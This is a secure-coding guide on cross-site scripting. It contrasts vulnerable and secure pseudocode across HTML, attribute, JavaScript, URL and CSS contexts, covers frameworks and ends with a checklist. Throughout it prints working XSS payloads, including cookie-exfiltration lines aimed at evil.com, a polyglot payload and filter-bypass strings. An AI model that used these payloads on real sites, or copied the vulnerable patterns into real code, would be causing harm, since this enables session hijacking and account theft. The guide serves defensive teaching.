# Pattern 3: Cross-Site Scripting (XSS)

## INSTRUCTIONS FOR AI/LLM

This document provides IN-DEPTH coverage of the most critical security anti-patterns.
Each section includes multiple examples, edge cases, and detailed explanations.
All code is PSEUDOCODE - implement using secure patterns in your target language.
Pay special attention to the "Common Mistakes" and "Edge Cases" subsections.
These patterns cause the majority of security vulnerabilities in AI-generated code.

**When generating code, you MUST:**
1. Never use string concatenation for SQL queries, shell commands, or HTML output
2. Never embed secrets, API keys, or credentials in source code
3. Always validate and sanitize all user input on the server side
4. Use parameterized queries, established authentication libraries, and context-aware encoding
5. Verify that any suggested packages actually exist before recommending them

---


---


**CWE References:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-80 (Basic XSS), CWE-83 (Improper Neutralization in Attributes), CWE-87 (Improper Neutralization in URI)

**Priority Score:** 23 (Frequency: 10, Severity: 8, Detectability: 5)

---

## Introduction: Why AI Often Misses Context-Specific Encoding

Cross-Site Scripting (XSS) is one of the most prevalent vulnerabilities in AI-generated code. Research shows that **86% of AI-generated code fails XSS defenses** (Veracode 2025), and AI-generated code is **2.74x more likely to contain XSS** than human-written code (CodeRabbit analysis).

**Why AI Models Generate XSS Vulnerabilities:**

1. **Context-Blindness:** XSS prevention requires understanding the *context* where user input will be rendered—HTML body, attributes, JavaScript, CSS, or URLs. Each context requires different encoding. AI models frequently apply generic or no encoding because they lack awareness of rendering context.

2. **Training Data Shows innerHTML Everywhere:** Tutorials and Stack Overflow answers heavily use `innerHTML`, `document.write()`, and template string injection for DOM manipulation. AI learns these as standard patterns.

3. **Framework Misunderstanding:** Modern frameworks like React provide automatic escaping, but AI often bypasses these safeguards using `dangerouslySetInnerHTML`, `v-html`, or raw template interpolation when the task seems to require "rich" HTML output.

4. **Encoding vs. Validation Confusion:** AI models often implement input validation (checking what characters are allowed) but skip output encoding (safely rendering data in context). Validation is for data integrity; encoding is for XSS prevention.

5. **Client-Side Trust:** AI frequently treats client-side code as "safe" since it runs in the browser. It fails to recognize that XSS attacks *exploit* the browser's trust in the application.

**Impact of XSS:**

- **Session Hijacking:** Attacker steals session cookies and impersonates victims
- **Account Takeover:** Keylogging, credential theft, or forced password changes
- **Data Exfiltration:** Stealing sensitive data displayed to the user
- **Malware Distribution:** Redirecting users to malicious sites
- **Defacement:** Altering page content for phishing or reputation damage
- **Worm Propagation:** Self-spreading XSS (Samy worm affected 1M MySpace users)

**XSS Variants:**

| Type | Storage | Execution | Example Vector |
|------|---------|-----------|----------------|
| **Reflected** | URL/Request | Immediate | Search query in results page |
| **Stored** | Database | Later visitors | Comment with script in blog |
| **DOM-based** | Client-side | JavaScript processes | URL fragment processed by JS |
| **Mutation (mXSS)** | Sanitizer bypass | DOM mutation | Markup that changes during parsing |

---

## Multiple BAD Examples Across Contexts

### BAD Example 1: HTML Body Injection

```pseudocode
// VULNERABLE: Direct injection into HTML body
function displayUserComment(comment):
    // User input directly placed in HTML
    document.getElementById("comments").innerHTML =
        "<div class='comment'>" + comment + "</div>"

// Attack: comment = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
// Result: Script executes, cookies sent to attacker

// VULNERABLE: Server-side template without encoding
function renderProfilePage(username, bio):
    return """
        <html>
        <body>
            <h1>Profile: {username}</h1>
            <p>{bio}</p>
        </body>
        </html>
    """.format(username=username, bio=bio)

// Attack: bio = "<img src=x onerror='alert(document.cookie)'>"
// Result: onerror handler executes JavaScript

// VULNERABLE: Using document.write
function showWelcome(name):
    document.write("<h2>Welcome, " + name + "!</h2>")

// Attack: name = "<img src=x onerror=alert('XSS')>"
```

**Why This Is Dangerous:**
- Script tags execute immediately upon DOM insertion
- Event handlers (`onerror`, `onload`, `onclick`) execute without script tags
- SVG elements can contain executable code
- `document.write` and `innerHTML` interpret HTML in user input

---

### BAD Example 2: HTML Attribute Injection

```pseudocode
// VULNERABLE: User input in HTML attributes
function renderImage(imageUrl, altText):
    return '<img src="' + imageUrl + '" alt="' + altText + '">'

// Attack: altText = '" onmouseover="alert(document.cookie)" x="'
// Result: <img src="img.jpg" alt="" onmouseover="alert(document.cookie)" x="">

// VULNERABLE: Unquoted attributes
function renderLink(url, text):
    return "<a href=" + url + ">" + text + "</a>"

// Attack: url = "http://site.com onclick=alert(1)"
// Result: <a href=http://site.com onclick=alert(1)>text</a>

// VULNERABLE: Input in style attribute
function setBackgroundColor(color):
    element.setAttribute("style", "background-color: " + color)

// Attack: color = "red; background-image: url('javascript:alert(1)')"
// Attack: color = "expression(alert('XSS'))"  // IE-specific

// VULNERABLE: Event handler attribute
function renderButton(buttonId, label):
    return '<button id="' + buttonId + '" onclick="handleClick(\'' + label + '\')">' + label + '</button>'

// Attack: label = "'); alert(document.cookie); ('"
// Result: onclick="handleClick(''); alert(document.cookie); ('")"
```

**Why This Is Dangerous:**
- Unquoted attributes break at whitespace, allowing new attributes
- Quoted attributes can break out with matching quotes
- Event handler attributes execute JavaScript directly
- Certain attributes (`href`, `src`, `style`) have special parsing rules

---

### BAD Example 3: JavaScript Context Injection

```pseudocode
// VULNERABLE: User input embedded in JavaScript
function generateUserScript(username):
    return """
        <script>
            var currentUser = '{username}';
            displayGreeting(currentUser);
        </script>
    """.format(username=username)

// Attack: username = "'; alert(document.cookie); //'"
// Result: var currentUser = ''; alert(document.cookie); //';

// VULNERABLE: JSON data embedded in script
function embedUserData(userData):
    return """
        <script>
            var data = {userData};
            processData(data);
        </script>
    """.format(userData=jsonEncode(userData))

// Attack: userData contains </script><script>alert(1)</script>
// JSON encoding doesn't prevent HTML context escape

// VULNERABLE: Template literals with user input
function renderTemplate(message):
    return `<script>showNotification("${message}")</script>`

// Attack: message = '${alert(document.cookie)}'  // Template literal injection
// Attack: message = '");alert(document.cookie);//'  // String escape

// VULNERABLE: Dynamic script construction
function addEventHandler(eventName, userCallback):
    element.setAttribute("onclick", "handleEvent('" + userCallback + "')")

// Attack: userCallback = "'); stealData(); ('"
```

**Why This Is Dangerous:**
- JavaScript string context requires JavaScript-specific escaping
- HTML closing tags (`</script>`) can break out of script blocks
- Template literals have their own injection risks
- Inline event handlers compound HTML and JavaScript contexts

---

### BAD Example 4: URL Context Injection

```pseudocode
// VULNERABLE: User input in href attribute
function renderNavLink(destination):
    return '<a href="' + destination + '">Click here</a>'

// Attack: destination = "javascript:alert(document.cookie)"
// Result: <a href="javascript:alert(document.cookie)">Click here</a>

// VULNERABLE: URL parameters without encoding
function buildSearchUrl(query):
    return '<a href="/search?q=' + query + '">Search again</a>'

// Attack: query = '" onclick="alert(1)" x="'
// Result: <a href="/search?q=" onclick="alert(1)" x="">Search again</a>

// VULNERABLE: Redirect based on user input
function handleRedirect(url):
    window.location = url

// Attack: url = "javascript:alert(document.cookie)"
// Result: JavaScript execution via location change

// VULNERABLE: Open redirect leading to XSS
function redirectAfterLogin(returnUrl):
    return '<meta http-equiv="refresh" content="0;url=' + returnUrl + '">'

// Attack: returnUrl = "data:text/html,<script>alert(1)</script>"
// Attack: returnUrl = "javascript:alert(1)"
```

**Why This Is Dangerous:**
- `javascript:` URLs execute code when navigated
- `data:` URLs can contain executable HTML/JavaScript
- `vbscript:` URLs execute on older IE
- URL encoding alone doesn't prevent protocol-based attacks

---

### BAD Example 5: CSS Context Injection

```pseudocode
// VULNERABLE: User input in CSS
function applyCustomStyle(customCss):
    styleElement = document.createElement("style")
    styleElement.textContent = ".user-style { " + customCss + " }"
    document.head.appendChild(styleElement)

// Attack: customCss = "} body { background: url('http://evil.com/log?data=' + document.cookie); } .x {"
// Result: CSS exfiltration of page data

// VULNERABLE: CSS expression (legacy IE)
function setWidth(width):
    element.style.cssText = "width: " + width

// Attack: width = "expression(alert(document.cookie))"
// Result: JavaScript execution via CSS expression (IE)

// VULNERABLE: CSS injection via style attribute
function renderAvatar(avatarUrl):
    return '<div style="background-image: url(' + avatarUrl + ')"></div>'

// Attack: avatarUrl = "x); } body { background: red; } .x { content: url(x"
// Modern Attack: avatarUrl = "https://evil.com/?' + btoa(document.body.innerHTML) + '"

// VULNERABLE: CSS @import injection
function loadTheme(themeUrl):
    return "<style>@import url('" + themeUrl + "');</style>"

// Attack: themeUrl = "'); } * { background: url('http://evil.com/steal?"
```

**Why This Is Dangerous:**
- CSS can exfiltrate data via `url()` requests
- Legacy IE `expression()` executes JavaScript
- CSS injection can alter page appearance for phishing
- `@import` can load attacker-controlled stylesheets

---

## GOOD Examples for Each Context

### GOOD Example 1: Proper HTML Encoding

```pseudocode
// SECURE: HTML entity encoding for body content
function htmlEncode(str):
    return str
        .replace("&", "&amp;")    // Must be first
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
        .replace("/", "&#x2F;")   // Prevents </script> escapes

function displayUserComment(comment):
    safeComment = htmlEncode(comment)
    document.getElementById("comments").innerHTML =
        "<div class='comment'>" + safeComment + "</div>"

// SECURE: Using textContent instead of innerHTML
function displayUserCommentSafe(comment):
    div = document.createElement("div")
    div.className = "comment"
    div.textContent = comment  // Automatically safe - no HTML interpretation
    document.getElementById("comments").appendChild(div)

// SECURE: Server-side template with auto-escaping
function renderProfilePage(username, bio):
    // Use templating engine with auto-escaping enabled
    return template.render("profile.html", {
        username: username,  // Engine auto-escapes
        bio: bio
    })

// SECURE: Framework createElement pattern
function createUserCard(name, email):
    card = document.createElement("article")

    nameEl = document.createElement("h3")
    nameEl.textContent = name  // Safe

    emailEl = document.createElement("p")
    emailEl.textContent = email  // Safe

    card.appendChild(nameEl)
    card.appendChild(emailEl)
    return card
```

**Why This Is Secure:**
- HTML entities are displayed as text, not interpreted as markup
- `textContent` never interprets HTML
- createElement + textContent is inherently safe
- Auto-escaping templates handle encoding automatically

---

### GOOD Example 2: Proper Attribute Encoding

```pseudocode
// SECURE: Attribute encoding (superset of HTML encoding)
function attributeEncode(str):
    return str
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
        .replace("`", "&#x60;")
        .replace("=", "&#x3D;")

// SECURE: Always quote attributes and encode values
function renderImage(imageUrl, altText):
    safeUrl = attributeEncode(imageUrl)
    safeAlt = attributeEncode(altText)
    return '<img src="' + safeUrl + '" alt="' + safeAlt + '">'

// SECURE: Using setAttribute (browser handles encoding)
function renderImageSafe(imageUrl, altText):
    img = document.createElement("img")
    img.setAttribute("src", imageUrl)   // Safe
    img.setAttribute("alt", altText)    // Safe
    return img

// SECURE: Data attributes with proper encoding
function renderDataElement(userId, userName):
    div = document.createElement("div")
    div.dataset.userId = userId      // Automatically safe
    div.dataset.userName = userName  // Automatically safe
    return div

// SECURE: Style attribute with validation
ALLOWED_COLORS = {"red", "blue", "green", "yellow", "#fff", "#000"}

function setBackgroundColor(color):
    if color in ALLOWED_COLORS:
        element.style.backgroundColor = color
    else:
        element.style.backgroundColor = "white"  // Safe default
```

**Why This Is Secure:**
- Quotes prevent attribute breakout
- Encoding prevents quote escapes
- setAttribute handles encoding automatically
- dataset properties are automatically safe
- Allowlists prevent injection of arbitrary values

---

### GOOD Example 3: JavaScript Encoding

```pseudocode
// SECURE: JavaScript string encoding
function jsStringEncode(str):
    return str
        .replace("\\", "\\\\")     // Backslash first
        .replace("'", "\\'")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("</", "<\\/")     // Prevent script tag escape
        .replace("<!--", "\\x3C!--") // Prevent HTML comment

// SECURE: JSON encoding for embedding data
function generateUserScript(userData):
    // Use proper JSON encoding and parse safely
    jsonData = jsonEncode(userData)

    // Also HTML-encode to prevent </script> breakout
    safeJson = htmlEncode(jsonData)

    return """
        <script>
            var data = JSON.parse('{safeJson}');
            processData(data);
        </script>
    """.format(safeJson=safeJson)

// BETTER: Use data attributes instead of inline scripts
function embedUserDataSafe(element, userData):
    // Store data in attribute, process in external script
    element.dataset.user = jsonEncode(userData)
    // External script reads: JSON.parse(element.dataset.user)

// SECURE: Separate data from code with JSON endpoint
function loadUserData():
    // Instead of embedding in HTML, fetch from API
    fetch('/api/user/data')
        .then(response => response.json())
        .then(data => processData(data))

// SECURE: Using structured data in script type
function embedStructuredData(pageData):
    return """
        <script type="application/json" id="page-data">
            {jsonData}
        </script>
        <script>
            var data = JSON.parse(
                document.getElementById('page-data').textContent
            );
        </script>
    """.format(jsonData=jsonEncode(pageData))
```

**Why This Is Secure:**
- JavaScript escaping prevents string breakout
- HTML encoding in script blocks prevents `</script>` escape
- Data attributes separate data from code
- JSON endpoints avoid embedding untrusted data in HTML
- `type="application/json"` blocks aren't executed as JavaScript

---

### GOOD Example 4: URL Encoding

```pseudocode
// SECURE: URL encoding for query parameters
function urlEncode(str):
    return encodeURIComponent(str)

function buildSearchUrl(query):
    safeQuery = urlEncode(query)
    return '/search?q=' + safeQuery

// SECURE: Validating URL schemes (allowlist)
SAFE_SCHEMES = {"http", "https", "mailto"}

function validateUrl(url):
    try:
        parsed = parseUrl(url)
        if parsed.scheme.lower() in SAFE_SCHEMES:
            return url
    catch:
        pass
    return "/fallback"  // Safe default

function renderLink(destination, text):
    safeUrl = validateUrl(destination)
    safeText = htmlEncode(text)
    return '<a href="' + attributeEncode(safeUrl) + '">' + safeText + '</a>'

// SECURE: URL validation with additional checks
function validateExternalUrl(url):
    parsed = parseUrl(url)

    // Check scheme
    if parsed.scheme.lower() not in {"http", "https"}:
        return null

    // Check for credential injection
    if parsed.username or parsed.password:
        return null

    // Check for IP address (optional restriction)
    if isIpAddress(parsed.host):
        return null

    return url

// SECURE: Relative URLs only (prevent open redirect)
function validateRedirectUrl(url):
    // Only allow relative paths
    if url.startsWith("/") and not url.startsWith("//"):
        // Prevent path traversal
        normalized = normalizePath(url)
        if not ".." in normalized:
            return normalized
    return "/"  // Safe default
```

**Why This Is Secure:**
- `encodeURIComponent` handles special characters
- Scheme allowlist prevents `javascript:` and `data:` URLs
- Relative-only validation prevents open redirects
- Multiple validation layers provide defense in depth

---

### GOOD Example 5: Using Safe APIs (textContent vs innerHTML)

```pseudocode
// SECURE: Safe DOM manipulation patterns

// Instead of innerHTML with user data:
// DANGEROUS: element.innerHTML = "<p>" + userInput + "</p>"

// SECURE: Use textContent for text nodes
function setElementText(element, text):
    element.textContent = text  // Never interprets HTML

// SECURE: Build DOM programmatically
function createListItem(text, isHighlighted):
    li = document.createElement("li")
    li.textContent = text  // Safe text assignment

    if isHighlighted:
        li.classList.add("highlighted")  // Safe class manipulation

    return li

// SECURE: Use template elements for complex HTML
function createCardFromTemplate(name, description):
    template = document.getElementById("card-template")
    card = template.content.cloneNode(true)

    // Set text content safely
    card.querySelector(".card-name").textContent = name
    card.querySelector(".card-desc").textContent = description

    return card

// SECURE: Use DocumentFragment for batch operations
function renderList(items):
    fragment = document.createDocumentFragment()

    for item in items:
        li = document.createElement("li")
        li.textContent = item.name  // Safe
        fragment.appendChild(li)

    document.getElementById("list").appendChild(fragment)

// SECURE: Sanitize when HTML is genuinely needed
function renderRichContent(htmlContent):
    // Use DOMPurify or similar trusted sanitizer
    sanitized = DOMPurify.sanitize(htmlContent, {
        ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
        ALLOWED_ATTR: ["href"],
        ALLOW_DATA_ATTR: false
    })
    element.innerHTML = sanitized
```

**Why This Is Secure:**
- `textContent` never interprets HTML or scripts
- `createElement` + `textContent` is inherently safe
- Templates allow complex HTML without injection risk
- DOMPurify provides sanitization when HTML is required

---

## Edge Cases Section

### Edge Case 1: Mutation XSS (mXSS)

```pseudocode
// DANGEROUS: Browser mutations can bypass sanitization

// How mXSS works:
// 1. Sanitizer processes malformed HTML
// 2. Browser "fixes" the HTML during parsing
// 3. Fixed HTML contains executable content

// Example: Backtick mutation
inputHtml = "<img src=x onerror=`alert(1)`>"
// Some sanitizers don't escape backticks
// Browser may convert backticks to quotes in certain contexts

// Example: Namespace confusion
inputHtml = "<math><annotation-xml><foreignObject><script>alert(1)</script>"
// SVG/MathML namespaces have different parsing rules
// Sanitizer might miss the nested script

// Example: Table element mutations
inputHtml = "<table><form><input name='x'></form></table>"
// Browser moves <form> outside <table> during parsing
// Can result in unexpected DOM structure

// SECURE: Use battle-tested sanitizer with mXSS protection
function sanitizeHtml(html):
    return DOMPurify.sanitize(html, {
        // DOMPurify has mXSS protection built-in
        USE_PROFILES: {html: true},
        // Optionally restrict further
        FORBID_TAGS: ["style", "math", "svg"],
        FORBID_ATTR: ["style"]
    })

// BETTER: Avoid HTML sanitization when possible
function renderUserContent(content):
    // If you only need formatted text, use markdown
    markdownHtml = markdownToHtml(content)  // Controlled conversion
    return DOMPurify.sanitize(markdownHtml)
```

**Detection:** Test with:
- Malformed nesting (`<a><table><a>`)
- Namespace elements (`<svg>`, `<math>`, `<foreignObject>`)
- Backticks and other unusual quote characters
- Processing instruction-like content (`<?xml>`)

---

### Edge Case 2: Polyglot Payloads

```pseudocode
// DANGEROUS: Payloads that work in multiple contexts

// Polyglot XSS example:
payload = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"

// This payload attempts to work in:
// - JavaScript context (javascript: URL)
// - HTML attribute context (onclick)
// - Inside HTML comments
// - Inside style/title/textarea/script tags
// - SVG context

// Why this matters:
// - Single payload tests multiple vectors
// - Fuzzy input handling might trigger in unexpected context
// - Copy-paste from "safe" context to unsafe context

// SECURE: Context-specific encoding, not generic filtering
function outputToContext(value, context):
    switch context:
        case "html_body":
            return htmlEncode(value)
        case "html_attribute":
            return attributeEncode(value)
        case "javascript_string":
            return jsStringEncode(value)
        case "url_parameter":
            return urlEncode(value)
        case "css_value":
            return cssEncode(value)
        default:
            throw Error("Unknown context: " + context)

// Each encoder handles that specific context's dangerous characters
```

**Detection:** Use polyglot payloads in security testing to find context confusion vulnerabilities.

---

### Edge Case 3: Encoding Bypass Techniques

```pseudocode
// DANGEROUS: Incomplete encoding can be bypassed

// Bypass 1: Case variation
// Filter checks: if "<script" in input: reject
// Bypass: "<ScRiPt>alert(1)</sCrIpT>"
// Browser: case-insensitive HTML parsing

// Bypass 2: HTML entities in event handlers
// Filter: remove "javascript:"
// Input: "&#106;avascript:alert(1)"
// Browser decodes entities before processing

// Bypass 3: Null bytes
// Input: "java\x00script:alert(1)"
// Some filters/WAFs don't handle null bytes
// Some browsers ignore them

// Bypass 4: Overlong UTF-8
// Normal '<': 0x3C
// Overlong: 0xC0 0xBC (invalid UTF-8, but some parsers accept)

// Bypass 5: Mixed encoding
// Input: "%3Cscript%3Ealert(1)%3C/script%3E"
// If HTML-encoded before URL-decoded, double encoding attack

// SECURE: Encode on output, not filter on input
function secureOutput(userInput, context):
    // Don't try to filter/blocklist dangerous patterns
    // DO encode appropriately for the output context

    // The encoding makes ALL user input safe
    // regardless of what it contains
    return encode(userInput, context)

// SECURE: Canonicalize THEN validate
function processInput(input):
    // 1. Decode all encoding layers
    decoded = fullyDecode(input)  // URL, HTML entities, etc.

    // 2. Normalize (lowercase, normalize unicode)
    normalized = normalize(decoded)

    // 3. Validate against rules
    if not isValid(normalized):
        reject()

    // 4. Store normalized form
    store(normalized)

    // 5. Encode on output (later)
```

**Key Insight:** Output encoding is more reliable than input filtering because you know the exact output context.

---

### Edge Case 4: DOM Clobbering

```pseudocode
// DANGEROUS: HTML elements can override JavaScript globals

// How DOM clobbering works:
// Elements with id or name attributes create global variables
html = '<img id="alert">'
// Now: window.alert === <img> element
// alert(1) throws error instead of showing alert

// Exploitable clobbering:
html = '<form id="document"><input name="cookie" value="fake"></form>'
// document.cookie might now reference the input element

// Attack on sanitizer output:
html = '<a id="cid" name="cid" href="javascript:alert(1)">'
// If code does: location = document.getElementById(cid)
// Attacker controls the navigation

// More dangerous patterns:
html = '<form id="x"><input id="y"></form>'
// x.y now references the input
// Chains allow deep property access

// SECURE: Avoid global lookups for security-sensitive operations
function getConfigValue(key):
    // DON'T: return window[key]
    // DON'T: return document.getElementById(key).value

    // DO: Use a namespaced config object
    return APP_CONFIG[key]

// SECURE: Use unique prefixes for security-critical IDs
function getElementById(id):
    // Prefix with app-specific namespace
    return document.getElementById("app__" + id)

// SECURE: Validate types after DOM queries
function getFormElement(id):
    element = document.getElementById(id)
    if element instanceof HTMLFormElement:
        return element
    throw Error("Expected form element")
```

**Detection:** Test with:
- Elements with IDs matching JavaScript globals (`alert`, `name`, `location`)
- Elements with names matching object properties (`cookie`, `domain`)
- Nested forms with chained name/id attributes

---

## Common Mistakes Section

### Mistake 1: Encoding Once, Using in Multiple Contexts

```pseudocode
// DANGEROUS: Single encoding for multiple contexts

function saveUserProfile(name, bio):
    // Encoding once at input time
    safeName = htmlEncode(name)
    safeBio = htmlEncode(bio)

    database.save({name: safeName, bio: safeBio})

function displayProfile(user):
    // HTML context - HTML encoding was correct
    htmlOutput = "<h1>" + user.name + "</h1>"  // OK

    // But JavaScript context needs different encoding!
    jsOutput = "<script>var name = '" + user.name + "';</script>"
    // If name contained single quotes: "O'Brien" -> already encoded as "O&#x27;Brien"
    // Now in JS context, &#x27; is literal text, not a quote escape

    // And URL context is wrong too!
    urlOutput = "/profile?name=" + user.name
    // HTML entities in URL don't encode properly

// SECURE: Store raw data, encode on output
function saveUserProfile(name, bio):
    // Store raw (unencoded) user input
    database.save({name: name, bio: bio})

function displayProfile(user):
    // Encode specifically for each output context
    htmlName = htmlEncode(user.name)
    jsName = jsStringEncode(user.name)
    urlName = urlEncode(user.name)

    htmlOutput = "<h1>" + htmlName + "</h1>"
    jsOutput = "<script>var name = '" + jsName + "';</script>"
    urlOutput = "/profile?name=" + urlName
```

**Rule:** Store data raw. Encode at the point of output, specific to that context.

---

### Mistake 2: Client-Side Only Sanitization

```pseudocode
// DANGEROUS: Relying only on client-side protection

// Client-side sanitization
function submitComment(comment):
    // Sanitize before sending to server
    cleanComment = DOMPurify.sanitize(comment)
    fetch("/api/comments", {
        method: "POST",
        body: JSON.stringify({comment: cleanComment})
    })

// Problem: Attacker bypasses client-side code entirely
// Using curl, Postman, or modified browser
curlCommand = """
curl -X POST https://site.com/api/comments \\
     -H "Content-Type: application/json" \\
     -d '{"comment": "<script>alert(1)</script>"}'
"""

// Server trusts the input because "client sanitized it"
function handleCommentApi(request):
    comment = request.body.comment
    database.saveComment(comment)  // Stored XSS!

// SECURE: Server-side sanitization is mandatory
function handleCommentApiSecure(request):
    comment = request.body.comment

    // Server-side sanitization
    cleanComment = serverSideSanitize(comment)

    database.saveComment(cleanComment)

function displayComment(comment):
    // Still encode on output (defense in depth)
    return htmlEncode(comment)

// NOTE: Client-side sanitization can still be useful for:
// - Preview functionality
// - Reducing server load
// - Better UX feedback
// But it must NEVER be the only protection
```

**Rule:** Server-side encoding/sanitization is mandatory. Client-side is optional enhancement.

---

### Mistake 3: Blocklist Approaches

```pseudocode
// DANGEROUS: Trying to block known-bad patterns

function filterXss(input):
    // Block list approach
    dangerous = [
        "<script", "</script>",
        "javascript:",
        "onerror", "onload", "onclick",
        "alert", "eval", "document.cookie"
    ]

    result = input
    for pattern in dangerous:
        result = result.replace(pattern, "")

    return result

// Bypasses:
// 1. Case: "<SCRIPT>alert(1)</SCRIPT>"
// 2. Encoding: "&#60;script&#62;alert(1)&#60;/script&#62;"
// 3. Null bytes: "<scr\x00ipt>alert(1)</scr\x00ipt>"
// 4. Other events: "onmouseover", "onfocus", "onanimationend"
// 5. Other sinks: "fetch('http://evil.com/'+document.cookie)"
// 6. New features: Future HTML/JS features not in blocklist

// DANGEROUS: Regex blocklist
function filterXssRegex(input):
    // Still bypassable
    if regex.match(/<script.*?>.*?<\/script>/i, input):
        return ""
    return input

// Bypass: "<scr<script>ipt>alert(1)</scr</script>ipt>"
// After removal: "<script>alert(1)</script>"

// SECURE: Allowlist approach
function sanitizeUsername(input):
    // Only allow expected characters
    if regex.match(/^[a-zA-Z0-9_-]{1,30}$/, input):
        return input
    throw ValidationError("Invalid username")

// SECURE: Proper encoding (makes blocklist unnecessary)
function displaySafely(input):
    return htmlEncode(input)  // All input is safe after encoding
```

**Rule:** Allowlist what's expected, or encode everything. Never blocklist dangerous patterns.

---

### Mistake 4: Trusting Sanitization Libraries Blindly

```pseudocode
// DANGEROUS: Assuming sanitization handles everything

function processHtml(userHtml):
    // "The library handles XSS"
    clean = sanitizer.sanitize(userHtml)

    // But then using it unsafely:
    // 1. Wrong context
    return "<script>var content = '" + clean + "';</script>"
    // Sanitizer cleaned HTML context, not JavaScript context

    // 2. Double encoding
    clean = sanitizer.sanitize(htmlEncode(userHtml))
    // Now clean contains encoded entities that might decode later

    // 3. Post-processing that reintroduces vulnerabilities
    processed = clean.replace("[link]", "<a href='").replace("[/link]", "'>link</a>")
    // Custom processing after sanitization can break safety

// SECURE: Understand what the sanitizer does
function processHtmlSecure(userHtml):
    // 1. Sanitize for HTML context
    cleanHtml = DOMPurify.sanitize(userHtml, {
        ALLOWED_TAGS: ["p", "b", "i", "a"],
        ALLOWED_ATTR: ["href"]
    })

    // 2. Validate URLs in allowed href attributes
    dom = parseHtml(cleanHtml)
    for link in dom.querySelectorAll("a[href]"):
        if not isValidUrl(link.href):
            link.removeAttribute("href")

    // 3. Use only in HTML context
    return cleanHtml

// SECURE: For JavaScript context, don't use HTML sanitizer
function embedDataInJs(data):
    // JSON encoding is the appropriate "sanitizer" for JSON/JS
    return JSON.stringify(data)  // Handles all escaping for JSON
```

**Rule:** Use the right encoding/sanitization for each context. Sanitizers are context-specific.

---

## Framework-Specific Guidance (Pseudocode Patterns)

### React Pattern

```pseudocode
// React default: Auto-escaping in JSX
function UserProfile(props):
    // SAFE: React escapes by default
    return (
        <div>
            <h1>{props.username}</h1>    // Auto-escaped
            <p>{props.bio}</p>            // Auto-escaped
        </div>
    )

// DANGEROUS: dangerouslySetInnerHTML bypasses protection
function RichContent(props):
    // VULNERABLE if props.html is user-controlled
    return <div dangerouslySetInnerHTML={{__html: props.html}} />

// SECURE: Sanitize before using dangerouslySetInnerHTML
function RichContentSafe(props):
    sanitizedHtml = DOMPurify.sanitize(props.html)
    return <div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />

// DANGEROUS: href with user input
function UserLink(props):
    // VULNERABLE: javascript: URLs execute
    return <a href={props.url}>{props.text}</a>

// SECURE: Validate URL scheme
function UserLinkSafe(props):
    url = props.url
    if not url.startsWith("http://") and not url.startsWith("https://"):
        url = "#"  // Safe fallback
    return <a href={url}>{props.text}</a>
```

---

### Vue Pattern

```pseudocode
// Vue default: Auto-escaping with {{ }}
<template>
    <!-- SAFE: Vue escapes interpolation -->
    <h1>{{ username }}</h1>
    <p>{{ bio }}</p>
</template>

// DANGEROUS: v-html bypasses protection
<template>
    <!-- VULNERABLE: v-html renders raw HTML -->
    <div v-html="userContent"></div>
</template>

// SECURE: Sanitize before v-html
<script>
export default {
    computed: {
        safeContent() {
            return DOMPurify.sanitize(this.userContent)
        }
    }
}
</script>
<template>
    <div v-html="safeContent"></div>
</template>

// DANGEROUS: Dynamic attribute binding
<template>
    <!-- VULNERABLE: javascript: in href -->
    <a :href="userUrl">Link</a>
</template>

// SECURE: URL validation
<script>
export default {
    computed: {
        safeUrl() {
            return this.isValidHttpUrl(this.userUrl) ? this.userUrl : '#'
        }
    }
}
</script>
```

---

### Angular Pattern

```pseudocode
// Angular default: Auto-sanitization
@Component({
    template: `
        <!-- SAFE: Angular sanitizes -->
        <h1>{{ username }}</h1>
        <p>{{ bio }}</p>
    `
})

// Angular [innerHTML] is semi-safe (Angular sanitizes)
@Component({
    template: `
        <!-- Angular sanitizes, but still risky -->
        <div [innerHTML]="userContent"></div>
    `
})

// DANGEROUS: Bypassing sanitization
import { DomSanitizer } from '@angular/platform-browser'

@Component({...})
class MyComponent {
    constructor(private sanitizer: DomSanitizer) {}

    // VULNERABLE: Bypasses Angular's sanitization
    get unsafeHtml() {
        return this.sanitizer.bypassSecurityTrustHtml(this.userInput)
    }
}

// SECURE: Let Angular sanitize, or use additional sanitizer
@Component({...})
class MyComponentSafe {
    get safeHtml() {
        // Angular's default sanitization is usually sufficient
        // For extra safety, pre-sanitize
        return DOMPurify.sanitize(this.userInput)
    }
}
```

---

### Server-Side Template Engines Pattern

```pseudocode
// Jinja2 (Python)
// SAFE: Auto-escaping by default
<h1>{{ username }}</h1>

// DANGEROUS: |safe filter
<div>{{ user_html | safe }}</div>  <!-- VULNERABLE -->

// Handlebars
// SAFE: {{ }} escapes
<h1>{{username}}</h1>

// DANGEROUS: {{{ }}} triple braces
<div>{{{user_html}}}</div>  <!-- VULNERABLE -->

// EJS (Node.js)
// SAFE: <%= %> escapes
<h1><%= username %></h1>

// DANGEROUS: <%- %> raw
<div><%- user_html %></div>  <!-- VULNERABLE -->

// SECURE PATTERN: Always use escaping syntax, sanitize if HTML needed
// Jinja2
<div>{{ user_html | sanitize }}</div>  <!-- Custom filter using DOMPurify -->

// Handlebars
<div>{{sanitize user_html}}</div>  <!-- Custom helper -->

// EJS
<div><%= sanitize(user_html) %></div>  <!-- Helper function -->
```

---

## Security Checklist

- [ ] All user input rendered in HTML is HTML-encoded
- [ ] All user input in HTML attributes is attribute-encoded and quoted
- [ ] All user input in JavaScript strings is JavaScript-encoded
- [ ] All user input in URLs is URL-encoded (and scheme validated for links)
- [ ] All user input in CSS is CSS-encoded or allowlist-validated
- [ ] `innerHTML`, `document.write`, and similar are avoided or use sanitized input
- [ ] `textContent` is used instead of `innerHTML` where possible
- [ ] `dangerouslySetInnerHTML`, `v-html`, `|safe` etc. only used with sanitized content
- [ ] URL schemes are validated (allow only http/https, not javascript:)
- [ ] Server-side encoding/sanitization is implemented (not just client-side)
